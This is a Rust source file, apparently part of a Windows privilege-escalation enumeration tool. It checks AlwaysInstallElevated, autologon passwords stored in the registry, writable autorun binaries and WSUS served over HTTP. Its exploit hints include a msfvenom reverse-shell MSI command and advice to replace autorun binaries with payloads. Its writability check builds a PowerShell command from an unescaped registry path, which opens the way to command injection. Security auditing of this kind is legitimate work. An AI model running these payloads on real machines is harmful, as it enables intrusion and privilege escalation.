use crate::checks::Check;
use crate::output::{Finding, Severity};
use std::process::Command;

pub struct RegistryCheck;

impl Check for RegistryCheck {
    fn run(&self) -> Vec<Finding> {
        let mut findings = Vec::new();

        check_always_install_elevated(&mut findings);
        check_autologon(&mut findings);
        check_autorun_entries(&mut findings);
        check_wsus(&mut findings);

        findings
    }
}

fn check_always_install_elevated(findings: &mut Vec<Finding>) {
    let hklm = reg_query(r"HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer", "AlwaysInstallElevated");
    let hkcu = reg_query(r"HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer", "AlwaysInstallElevated");

    if hklm.contains("0x1") && hkcu.contains("0x1") {
        findings.push(Finding {
            check: "registry",
            severity: Severity::Critical,
            title: "AlwaysInstallElevated enabled".into(),
            detail: "both HKLM and HKCU keys set to 1".into(),
            path: None,
            exploit_hint: Some("msfvenom -p windows/x64/shell_reverse_tcp -f msi -o shell.msi && msiexec /i shell.msi".into()),
        });
    }
}

fn check_autologon(findings: &mut Vec<Finding>) {
    let key = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
    let username = reg_query(key, "DefaultUserName");
    let password = reg_query(key, "DefaultPassword");

    if !password.is_empty() && !password.contains("ERROR") {
        findings.push(Finding {
            check: "registry",
            severity: Severity::Critical,
            title: "autologon credentials in registry".into(),
            detail: format!("user: {}", username.trim()),
            path: Some(key.to_string()),
            exploit_hint: Some("plaintext password stored in DefaultPassword registry value".into()),
        });
    }
}

fn check_autorun_entries(findings: &mut Vec<Finding>) {
    let autorun_keys = [
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
    ];

    for key in &autorun_keys {
        let output = match Command::new("reg")
            .args(["query", key])
            .output()
        {
            Ok(o) => o,
            Err(_) => continue,
        };

        let stdout = String::from_utf8_lossy(&output.stdout);
        for line in stdout.lines() {
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with("HKEY_") { continue; }

            if let Some(path) = extract_path(trimmed) {
                if is_writable(&path) {
                    findings.push(Finding {
                        check: "registry",
                        severity: Severity::High,
                        title: "writable autorun binary".into(),
                        detail: trimmed.to_string(),
                        path: Some(path),
                        exploit_hint: Some("replace binary to run payload at next logon".into()),
                    });
                }
            }
        }
    }
}

fn check_wsus(findings: &mut Vec<Finding>) {
    let key = r"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate";
    let server = reg_query(key, "WUServer");

    if server.contains("http://") {
        findings.push(Finding {
            check: "registry",
            severity: Severity::High,
            title: "WSUS over HTTP (not HTTPS)".into(),
            detail: server.trim().to_string(),
            path: Some(key.to_string()),
            exploit_hint: Some("MITM WSUS updates to deliver malicious patches".into()),
        });
    }
}

fn reg_query(key: &str, value: &str) -> String {
    Command::new("reg")
        .args(["query", key, "/v", value])
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default()
}

fn extract_path(line: &str) -> Option<String> {
    let parts: Vec<&str> = line.splitn(3, "    ").collect();
    if parts.len() < 3 { return None; }
    let val = parts[2].trim();
    let path = val.trim_matches('"').split_whitespace().next()?;
    if path.contains('\\') || path.contains('/') {
        Some(path.to_string())
    } else {
        None
    }
}

fn is_writable(path: &str) -> bool {
    Command::new("powershell")
        .args(["-NoProfile", "-Command",
            &format!("try {{ [IO.File]::OpenWrite('{path}\\test.tmp').Close(); Remove-Item '{path}\\test.tmp' -ErrorAction SilentlyContinue; 'writable' }} catch {{ 'no' }}")])
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).contains("writable"))
        .unwrap_or(false)
}
